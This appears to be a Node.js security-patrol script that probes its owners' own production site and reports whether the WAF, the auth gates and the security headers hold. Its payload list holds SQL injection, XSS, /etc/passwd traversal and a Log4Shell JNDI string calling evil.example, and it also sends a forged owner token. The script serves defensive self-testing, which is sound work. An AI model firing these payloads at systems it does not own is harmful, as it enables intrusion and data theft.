#!/usr/bin/env node
/**
 * security-patrol.mjs — external black-box probe of the production site.
 *
 * Run daily by .github/workflows/security-patrol.yml (and on demand). It
 * "tries to hack in" exactly the way an opportunistic attacker would
 * (SQLi, XSS, path traversal, Log4Shell, time-based SQLi, unauthenticated
 * admin access) against OUR OWN production URL, verifies the in-worker WAF
 * and auth gates answer correctly, audits the security headers, and reads
 * the canary's WAF counters to report real intrusion attempts that were
 * detected and blocked since the last deploy.
 *
 * v2 hardening after the first live run (2026-10-22):
 *  - Requests carry an honest, browser-shaped UA; a raw "github-actions"
 *    UA can trip Cloudflare edge bot heuristics and poison every verdict.
 *  - Verdicts are body-aware: a 200 whose JSON says success:false IS a
 *    denial; a 403 whose body is a Cloudflare block/challenge page is EDGE
 *    interception, not our worker WAF (both count as "attack blocked", but
 *    the report says which layer did it).
 *  - Cloudflare edge-cache leaks on authenticated API paths (a real 200
 *    WITH DATA served from cache, cf-cache-status: HIT) are flagged
 *    separately — status codes alone cannot see this.
 *  - Network-level failures (HTTP 0) are retried, then reported as edge
 *    interference with CF dashboard guidance instead of "auth broken".
 *  - Never hand-set content-length (a wrong manual value makes the server
 *    wait for bytes that never arrive → guaranteed timeout).
 *
 * Output: human-readable log on stderr + a single JSON document on stdout
 * between the markers ::PATROL-JSON:: (parsed by the workflow) + report.md.
 * Exit code is always 0 unless the script itself crashes — findings are
 * data, not failures.
 */

import { writeFileSync } from 'node:fs';

const BASE = (process.env.PATROL_BASE_URL || 'https://stock.afmarbre.com').replace(/\/+$/, '');
// Honest but browser-shaped: identifies us, links back to the repo, and
// avoids tripping edge bot heuristics that punish raw "curl/github" UAs.
const UA =
  'Mozilla/5.0 (compatible; AtlasSecurityPatrol/1.0; +https://github.com/Etherealmber/atlas-commerce)';

const CHALLENGE_RE =
  /(just a moment|cf-challenge|challenge-platform|cf-browser-verification|attention required|cloudflare to restrict access|enable javascript and cookies)/i;

const results = [];
function check(id, title, severity, ok, detail, fix) {
  results.push({ id, title, severity: ok ? 'none' : severity, ok, detail, fix: ok ? '' : fix });
  process.stderr.write(`${ok ? 'PASS' : 'FIND'} [${id}] ${title}${ok ? '' : ` — ${detail}`}\n`);
}

async function probe(path, init = {}, { retries = 0, retryDelayMs = 2000 } = {}) {
  const url = `${BASE}${path}`;
  let last = null;
  for (let attempt = 0; attempt <= retries; attempt++) {
    if (attempt > 0) await new Promise((r) => setTimeout(r, retryDelayMs));
    try {
      const res = await fetch(url, {
        redirect: 'manual',
        signal: AbortSignal.timeout(20_000),
        ...init,
        headers: { 'User-Agent': UA, Accept: 'application/json', ...(init.headers || {}) },
      });
      const text = await res.text().catch(() => '');
      return {
        status: res.status,
        headers: Object.fromEntries(res.headers.entries()),
        text: text.slice(0, 4000),
        attempts: attempt + 1,
      };
    } catch (e) {
      last = { status: 0, headers: {}, text: '', error: String(e?.message || e), attempts: attempt + 1 };
    }
  }
  return last;
}

// NOTE: never classify by the `server: cloudflare` header — EVERY response
// from the zone carries it. Edge pages are recognized by their BODY only.
const isEdgePage = (r) => CHALLENGE_RE.test(r.text || '');
// Responses served FROM the edge cache (not just fresh misses). STALE /
// EXPIRED / REVALIDATED still mean the edge stored and replayed it — for an
// authenticated API path that is the same leak class as HIT.
const CACHED_STATES = new Set(['HIT', 'STALE', 'EXPIRED', 'REVALIDATED']);
const cfCache = (r) => (r.headers['cf-cache-status'] || '').toUpperCase();
const fromEdgeCache = (r) => CACHED_STATES.has(cfCache(r));

/** Body-aware denial check for sensitive endpoints. */
function classifyAuthzProbe(r) {
  if (r.status === 0) {
    return { verdict: 'edge-interference', detail: `no HTTP response after ${r.attempts} attempt(s): ${r.error}` };
  }
  if ([401, 403, 404, 405].includes(r.status)) {
    const layer = r.status === 403 && !/WAF_BLOCKED|OWNER_ONLY|UNAUTHORIZED|success/i.test(r.text) && isEdgePage(r) ? ' (Cloudflare edge page)' : '';
    return { verdict: 'denied', detail: `HTTP ${r.status}${layer}` };
  }
  if (r.status >= 200 && r.status < 300) {
    // A JSON error body is still a denial (some gates answer 200 + success:false).
    if (/"success"\s*:\s*false/i.test(r.text) || /(OWNER_ONLY|UNAUTHORIZED|FORBIDDEN)/i.test(r.text)) {
      return { verdict: 'denied', detail: `HTTP ${r.status} with JSON denial body` };
    }
    if (fromEdgeCache(r)) {
      return { verdict: 'cache-leak', detail: `HTTP ${r.status} served from Cloudflare edge cache (cf-cache-status: ${cfCache(r)}) — authenticated API content is being replayed to anonymous visitors` };
    }
    if (isEdgePage(r)) {
      return { verdict: 'edge-interference', detail: `HTTP ${r.status} but the body is a Cloudflare challenge/block page, not our worker's response` };
    }
    return { verdict: 'exposed', detail: `HTTP ${r.status} with non-denial body${cfCache(r) ? ` (cf-cache-status: ${cfCache(r)})` : ''}: ${(r.text || '').slice(0, 160)}` };
  }
  if (r.status >= 500) return { verdict: 'error', detail: `server error HTTP ${r.status}` };
  return { verdict: 'denied', detail: `HTTP ${r.status}` };
}

const wafPayloads = [
  { id: 'waf-sqli-union', name: 'SQL injection (UNION SELECT)', path: '/api/products?search=1%20UNION%20SELECT%20password%20FROM%20users', fix: 'WAF signature `union select` not blocking — verify the v232 WAF middleware is still mounted before all /api routes in worker/index.ts.' },
  { id: 'waf-sqli-time', name: 'Time-based SQL injection (WAITFOR DELAY)', path: "/api/products?q=x%3BWAITFOR%20DELAY%20%270%3A0%3A5%27", fix: 'WAF signature `waitfor delay` not blocking — check WAF_SIGS in worker/index.ts.' },
  { id: 'waf-xss', name: 'Reflected XSS (<script>)', path: '/api/products?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E', fix: 'WAF signature `<script` not blocking — check WAF_SIGS; also confirm the payload is not reflected in the JSON body.' },
  { id: 'waf-traversal', name: 'Path traversal (/etc/passwd)', path: '/api/products?file=..%2F..%2Fetc%2Fpasswd', fix: 'WAF signature `../etc` not blocking — check WAF_SIGS in worker/index.ts.' },
  { id: 'waf-log4j', name: 'Log4Shell (JNDI lookup)', path: '/api/products?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D', fix: 'Neither the worker WAF nor the Cloudflare edge blocked the JNDI payload — check WAF_SIGS in worker/index.ts and the CF managed ruleset.' },
];

async function main() {
  process.stderr.write(`security-patrol probing ${BASE}\n`);
  const startedAt = new Date().toISOString();

  // 0. Site reachable at all? (retry: cold isolates / transient edge hiccups)
  const health = await probe('/api/health', {}, { retries: 2 });
  if (health.status === 0) {
    check('site-up', 'Production site reachable', 'critical', false,
      `no response from ${BASE} after ${health.attempts} attempts: ${health.error}`,
      'Site unreachable — verify the worker is deployed (`npx wrangler deploy`) and DNS/custom domain stock.afmarbre.com still points at it.');
    emit(startedAt, { reachable: false });
    return;
  }
  const healthDenied = [401, 403].includes(health.status);
  const healthBodyIsJson = /^\s*[{[]/.test(health.text || '');
  const healthLayer = isEdgePage(health) ? 'Cloudflare edge block/challenge page'
    : healthBodyIsJson ? 'worker JSON denial'
    : fromEdgeCache(health) ? `edge-cached response (cf-cache-status: ${cfCache(health)})`
    : `unknown layer (cf-cache-status: ${cfCache(health) || 'none'})`;
  check('site-up', 'Production site reachable (/api/health → 200)', 'critical', health.status === 200,
    `HTTP ${health.status} — ${healthLayer}`,
    healthDenied
      ? (fromEdgeCache(health)
        ? 'The edge is replaying a STALE cached denial of /api/health from before the exemption was deployed. Fix: CF dashboard → Caching → Configuration → Purge Everything (or purge this URL), and add a Cache Rule bypassing cache for /api/* on stock.afmarbre.com. The worker now also sends CDN-Cache-Control: no-store on all non-public /api responses.'
        : isEdgePage(health)
          ? 'CF dashboard → Security → Events: a WAF/bot rule is challenging CI runners (allow the AtlasSecurityPatrol UA), then re-run the patrol.'
          : 'The deployed worker still denies /api/health — main (PR #57 exemption) has not finished deploying. Workers Builds usually deploys pushes to main automatically; wait a few minutes or trigger the build, then re-run the patrol.')
      : 'GET /api/health must return 200 — check the Cloudflare dashboard for deploy errors.');

  // 1. Canary + WAF intrusion counters (real attacks detected since last deploy)
  const canary = await probe('/api/canary');
  let wafInfo = null;
  if ((canary.status === 200 || canary.status === 503) && !isEdgePage(canary)) {
    try {
      const j = JSON.parse(canary.text);
      wafInfo = j?.data?.waf || null;
      const checks = j?.data?.checks || {};
      const bad = Object.entries(checks).filter(([, v]) => !v?.ok).map(([k]) => k);
      check('canary-subsystems', 'Canary: D1/KV/R2 subsystems healthy', 'high', bad.length === 0,
        `unhealthy subsystems: ${bad.join(', ')}`,
        `Canary reports ${bad.join(' + ')} failing — check the binding still exists in wrangler.jsonc and the resource in the Cloudflare dashboard.`);
    } catch { /* not JSON */ }
  } else {
    check('canary-subsystems', 'Canary: D1/KV/R2 subsystems healthy', 'high', false,
      `canary unusable (HTTP ${canary.status}${isEdgePage(canary) ? ', edge page' : ''}) — subsystem state unknown`,
      'GET /api/canary must be public JSON — deploy main (the /api/canary exemption) and check CF Security events if an edge rule challenges it.');
  }
  check('canary-up', 'Canary endpoint responds', 'medium', canary.status === 200 || canary.status === 503,
    `HTTP ${canary.status}`, 'GET /api/canary should answer 200 (or 503 when a subsystem is down) — it exposes no secrets; make sure the route was not removed and is publicly reachable.');

  // 2. Active intrusion probes — blocked by our WAF (403 WAF_BLOCKED) or by
  //    the Cloudflare edge (403 block page). Anything that is NOT a 4xx, or
  //    that reflects the payload, is a real failure.
  for (const p of wafPayloads) {
    const r = await probe(p.path);
    const leaked = r.status >= 200 && r.status < 300 && /(password|sqlite_master|<script|root:x:)/i.test(r.text);
    const blockedByWorker = r.status === 403 && /WAF_BLOCKED/i.test(r.text);
    const blockedByEdge = r.status === 403 && !blockedByWorker; // CF managed rules (e.g. Log4Shell) answer before the worker
    const blocked = (r.status >= 400 && r.status < 500 && !leaked) || blockedByWorker || blockedByEdge;
    const layer = blockedByWorker ? 'worker WAF' : blockedByEdge ? 'Cloudflare edge' : `HTTP ${r.status}`;
    check(p.id, `WAF blocks ${p.name}`, 'critical', blocked,
      `expected a 4xx block, got HTTP ${r.status}${leaked ? ' AND payload reflected in body' : ''}`, p.fix);
    if (blocked) process.stderr.write(`        blocked by: ${layer}\n`);
  }

  // 3. Unauthenticated access to sensitive endpoints must be denied
  //    (body-aware: a 200 + success:false JSON is a denial; a 200 from the
  //    edge CACHE with real data is a critical leak).
  const adminProbes = [
    { id: 'authz-r2-list', path: '/api/admin/r2/images', name: 'admin R2 listing without session', fix: 'GET /api/admin/r2/images answered without a denial body — requireOwner() gate missing/broken in worker/index.ts, OR Cloudflare is serving a cached authenticated response (check cf-cache-status). CF fix: add a Cache Rule bypassing cache for /api/*.' },
    { id: 'authz-android-release-get', path: '/api/admin/android-release', name: 'CI release endpoint without token (GET)', fix: 'The CI ingestion endpoint must never answer 200 without a Bearer token — check the auth block at the top of worker/routes/androidRelease.ts.' },
    { id: 'authz-users', path: '/api/users', name: 'user listing without session', fix: 'GET /api/users returned data without auth — verify the /api/* auth middleware exemption list in worker/index.ts did not grow too wide.' },
  ];
  for (const a of adminProbes) {
    const r = await probe(a.path, {}, { retries: 1 });
    const v = classifyAuthzProbe(r);
    const ok = v.verdict === 'denied';
    const severity = v.verdict === 'cache-leak' || v.verdict === 'exposed' ? 'critical'
      : v.verdict === 'edge-interference' ? 'medium' : 'high';
    check(a.id, `Denies ${a.name}`, severity, ok, v.detail,
      ok ? '' : v.verdict === 'edge-interference'
        ? `Cloudflare edge interfered with the probe of ${a.path} — Security → Events in the CF dashboard: allow the AtlasSecurityPatrol UA / GH Actions IPs, then re-run the patrol. The worker itself could not be verified.`
        : a.fix);
  }
  // 3b. The 2026-10-22 incident regression: a FORGED v2 token (base64 is
  //     not signed by the attacker) must NOT pass as owner — the middleware
  //     verifies the HMAC proof via authFailReason().
  const forged = 'Bearer ' + Buffer.from('stock-auth-v2|attacker|owner|8.8.8.8|none|deadbeefdeadbeef').toString('base64');
  for (const t of [
    { id: 'forged-token-r2', path: '/api/admin/r2/images', name: 'forged owner token on admin R2 listing' },
    { id: 'forged-token-config', path: '/api/admin/config', name: 'forged owner token on admin config' },
  ]) {
    const r = await probe(t.path, { headers: { Authorization: forged } });
    const v = classifyAuthzProbe(r);
    check(t.id, `Rejects ${t.name}`, 'critical', v.verdict === 'denied', v.detail,
      'A hand-crafted base64 token was accepted — the HMAC proof verification (authFailReason) is not running for this route. It must be covered by the /api/* auth middleware registered BEFORE all routes in worker/index.ts.');
  }
  // 3c. More anonymous admin probes (routes that sat before the middleware
  //     during the 2026-10-22 owner-fallback incident).
  for (const a of [
    { id: 'authz-audit', path: '/api/admin/audit', name: 'audit log without session' },
    { id: 'authz-config', path: '/api/admin/config', name: 'admin config without session' },
    { id: 'authz-me', path: '/api/auth/me', name: 'identity endpoint without session' },
    { id: 'authz-migrate', path: '/api/admin/db-migrate/status', name: 'DB migration status without session' },
  ]) {
    const r = await probe(a.path, {}, { retries: 1 });
    const v = classifyAuthzProbe(r);
    const ok = v.verdict === 'denied';
    const severity = v.verdict === 'cache-leak' || v.verdict === 'exposed' ? 'critical'
      : v.verdict === 'edge-interference' ? 'medium' : 'high';
    check(a.id, `Denies ${a.name}`, severity, ok, v.detail,
      ok ? '' : v.verdict === 'edge-interference'
        ? `Cloudflare edge interfered with the probe of ${a.path} — check CF dashboard → Security → Events (allow the AtlasSecurityPatrol UA), then re-run the patrol.`
        : `GET ${a.path} answered without a denial body — the /api/* auth middleware must be registered before all routes in worker/index.ts (see the AUTH GATE block).`);
  }

  // POST without a Bearer token must be a 401 UNAUTHORIZED from the worker.
  // NB: never hand-set content-length — undici computes it from the body.
  const postBody = 'x'.repeat(20_000);
  const postRelease = await probe('/api/admin/android-release', {
    method: 'POST',
    headers: { 'Content-Type': 'application/octet-stream' },
    body: postBody,
  }, { retries: 1 });
  if (postRelease.status === 0) {
    check('authz-android-release-post', 'POST release ingestion without Bearer → 401 UNAUTHORIZED', 'medium', false,
      `no HTTP response after ${postRelease.attempts} attempts (${postRelease.error}) — likely Cloudflare edge reset/challenge on a bodied POST from a CI IP`,
      'Cannot verify the endpoint through the edge — CF dashboard → Security → Events: check for a rule challenging/resetting POSTs from GitHub Actions IPs (allow the AtlasSecurityPatrol UA), then re-run the patrol.');
  } else {
    const unauthorizedOk = postRelease.status === 401 && /UNAUTHORIZED/.test(postRelease.text);
    check('authz-android-release-post', 'POST release ingestion without Bearer → 401 UNAUTHORIZED', 'critical', unauthorizedOk,
      `expected 401 UNAUTHORIZED, got HTTP ${postRelease.status}${isEdgePage(postRelease) ? ' (Cloudflare edge page)' : ''}`,
      'POST /api/admin/android-release must reject tokenless uploads with {ok:false,success:false,error:"UNAUTHORIZED"} — check secretMatches() in worker/routes/androidRelease.ts. If the body is a CF page, an edge rule intercepted the probe (Security → Events).');
  }

  // 4. Security headers on the SPA shell
  const home = await probe('/');
  const headerChecks = [
    ['X-Content-Type-Options', 'nosniff', 'medium', "Add `c.header('X-Content-Type-Options', 'nosniff')` in the global middleware of worker/index.ts."],
    ['X-Frame-Options', 'DENY', 'medium', 'Add X-Frame-Options: DENY in the global middleware — protects against clickjacking.'],
    ['Content-Security-Policy', null, 'high', 'The CSP header is missing — restore the policy block in the global middleware of worker/index.ts.'],
    ['Strict-Transport-Security', null, 'high', 'HSTS missing — the header must be set for non-localhost hosts in worker/index.ts (and the request must be HTTPS).'],
    ['Referrer-Policy', null, 'low', 'Referrer-Policy missing — add it to the global security-headers middleware.'],
  ];
  for (const [h, expected, sev, fix] of headerChecks) {
    const v = home.headers[h.toLowerCase()] || '';
    const ok = expected ? v.toLowerCase() === expected.toLowerCase() : v.length > 0;
    check(`header-${h.toLowerCase()}`, `Security header ${h}`, sev, ok,
      `header ${h} = "${v || '(missing)'}" (expected ${expected || 'present'})`, fix);
  }

  // 5. Public update endpoint hygiene
  const upd = await probe('/api/app/android-update?versionCode=1&versionName=0.0.1');
  const noCache = /no-cache/.test(upd.headers['cache-control'] || '');
  const noSecrets = !/(_token|api[_-]?key|secret|password)/i.test(upd.text);
  check('update-endpoint', 'Public update endpoint: no-cache + no secrets', 'high',
    upd.status === 200 && noCache && noSecrets,
    `HTTP ${upd.status}, cache-control="${upd.headers['cache-control'] || '(none)'}", secrets-in-body=${!noSecrets}`,
    'GET /api/app/android-update must be public, answer Cache-Control: no-cache and never include tokens/keys — review buildAndroidUpdateResponse() in worker/routes/androidRelease.ts.');
  const headMirror = await probe('/app-updates/android/latest.json', { method: 'HEAD' });
  check('mirror-head', 'HEAD /app-updates/* answered properly (200/404, not 405)', 'medium',
    headMirror.status === 200 || headMirror.status === 404,
    `HTTP ${headMirror.status}`,
    'HEAD on the CDN1 mirror paths must go through serveAppUpdatesAsset() → bucket.head(); a 405 means the explicit fetch() dispatch in worker/index.ts is missing.');

  await cfSelfHeal(startedAt);
  emit(startedAt, { reachable: true, waf: wafInfo });
}

/* ── Optional Cloudflare integration (set CF_API_TOKEN as a repo secret) ──
 * Token scopes needed (Zone-level for afmarbre.com):
 *   Zone → Read · Zone → Cache Purge → Edit · Zone → Security Events → Read
 * With it the patrol: (1) PURGES any URL it caught being replayed from the
 * edge cache, and (2) looks up the firewall/bot rule that challenged its own
 * requests so the issue names the exact rule to fix. Without it, findings
 * still ship with manual dashboard guidance. CF_ZONE_ID optional (else the
 * zone is resolved from the target hostname). */
async function cfSelfHeal(startedAt) {
  const token = (process.env.CF_API_TOKEN || '').trim();
  if (!token) {
    process.stderr.write('CF_API_TOKEN not set — skipping purge/firewall-event lookup (guidance-only mode)\n');
    return;
  }
  const api = async (path, init = {}) => {
    const res = await fetch(`https://api.cloudflare.com/client/v4${path}`, {
      signal: AbortSignal.timeout(20_000),
      ...init,
      headers: { Authorization: `Bearer ${token}`, 'Content-Type': 'application/json', ...(init.headers || {}) },
    });
    return res.json().catch(() => ({}));
  };
  let zone = (process.env.CF_ZONE_ID || '').trim();
  try {
    if (!zone) {
      const host = new URL(BASE).hostname.replace(/^[^.]+\./, ''); // stock.afmarbre.com → afmarbre.com
      const z = await api(`/zones?name=${encodeURIComponent(host)}`);
      zone = z?.result?.[0]?.id || '';
    }
    if (!zone) { process.stderr.write('CF zone not resolvable — skipping\n'); return; }

    // 1) Purge every URL caught being served from the edge cache
    const leaked = results.filter((r) => !r.ok && /edge cache|cf-cache-status/i.test(r.detail || ''));
    const purgeFiles = [];
    for (const r of leaked) {
      const p = ({ 'authz-r2-list': '/api/admin/r2/images', 'site-up': '/api/health' })[r.id];
      if (p) purgeFiles.push(BASE + p);
    }
    if (purgeFiles.length) {
      const p = await api(`/zones/${zone}/purge_cache`, { method: 'POST', body: JSON.stringify({ files: purgeFiles }) });
      const note = p?.success ? `✅ Auto-purged from Cloudflare edge cache: ${purgeFiles.join(', ')}` : `⚠️ Purge failed: ${JSON.stringify(p?.errors || p).slice(0, 200)}`;
      for (const r of leaked) { r.detail += ` — ${note}`; process.stderr.write(note + '\n'); }
    }

    // 2) Name the firewall rule that challenged/blocked our probes
    const blocked = results.filter((r) => !r.ok && /challenge|block\/challenge|edge block/i.test(r.detail || ''));
    if (blocked.length) {
      const ev = await api(`/zones/${zone}/security/events/filter`, {
        method: 'POST',
        body: JSON.stringify({ filter: { datetime: { since: startedAt } } }),
      });
      const events = (ev?.result?.info || ev?.result || []).slice ? (ev?.result?.info || ev?.result || []) : [];
      const mine = (Array.isArray(events) ? events : []).filter((e) => /AtlasSecurityPatrol/i.test(JSON.stringify(e))).slice(0, 5);
      if (mine.length) {
        const rule = mine.map((e) => `${e.action || '?'} by ${e.description || e.rule_id || 'unknown rule'}`).join(' | ');
        for (const r of blocked) r.fix = `Cloudflare rule identified from Security Events: ${rule}. Adjust it (CF dashboard → Security → WAF → Tools/Custom rules, or Bot Fight Mode) to ALLOW the AtlasSecurityPatrol UA, then re-run the patrol. ` + r.fix;
        process.stderr.write(`CF security events matched: ${rule}\n`);
      } else {
        process.stderr.write('No matching CF security events found for our UA (events may lag a few minutes)\n');
      }
    }
  } catch (e) {
    process.stderr.write(`CF self-heal skipped: ${e?.message || e}\n`);
  }
}

function emit(startedAt, extra) {
  const findings = results.filter((r) => !r.ok);
  const doc = {
    base: BASE,
    startedAt,
    finishedAt: new Date().toISOString(),
    totalChecks: results.length,
    passed: results.length - findings.length,
    findings,
    results,
    ...extra,
  };
  process.stdout.write('::PATROL-JSON::' + JSON.stringify(doc) + '::END-PATROL-JSON::\n');

  // Human-readable issue body (written next to the JSON for the workflow).
  const waf = doc.waf;
  const lines = [
    `## 🛡️ Security patrol — ${doc.startedAt}`,
    ``,
    `Cible : **${doc.base}** · ${doc.passed}/${doc.totalChecks} contrôles OK`,
    ``,
  ];
  if (waf && waf.blocked) {
    lines.push(
      `### 🚨 Intrusions réelles détectées et bloquées par le WAF`,
      ``,
      `**${waf.blocked} requête(s) malveillante(s)** bloquée(s) depuis le dernier déploiement — dernière signature \`${waf.lastSig || '?'}\` à ${waf.lastAt || '?'}.`,
      `Le pare-feu applicatif fonctionne : ces tentatives ont échoué (403 WAF_BLOCKED), rien à corriger de ce côté.`,
      ``,
    );
  } else {
    lines.push(
      `### ✅ WAF`,
      ``,
      `Aucune tentative d'intrusion bloquée depuis le dernier déploiement (compteur canary à 0).`,
      ``,
    );
  }
  if (findings.length) {
    lines.push(`### ⚠️ Points à corriger (${findings.length})`, ``);
    for (const f of findings) {
      lines.push(`- **[${String(f.severity).toUpperCase()}] ${f.title}** — ${f.detail}`);
      lines.push(`  - 🔧 Fix possible : ${f.fix}`);
    }
    lines.push(``);
  } else {
    lines.push(
      `### ✅ Aucun point à corriger`,
      ``,
      `Toutes les sondes d'intrusion sont bloquées, les en-têtes de sécurité sont présents et les endpoints sensibles refusent les accès non authentifiés.`,
      ``,
    );
  }
  try {
    const out = process.env.PATROL_REPORT || 'report.md';
    writeFileSync(out, lines.join('\n'));
    process.stderr.write(`report written to ${out}\n`);
  } catch (e) {
    process.stderr.write(`report write failed: ${e?.message || e}\n`);
  }
}

main().catch((e) => {
  process.stderr.write(`patrol crashed: ${e?.stack || e}\n`);
  emit(new Date().toISOString(), { reachable: false, crash: String(e?.message || e) });
});
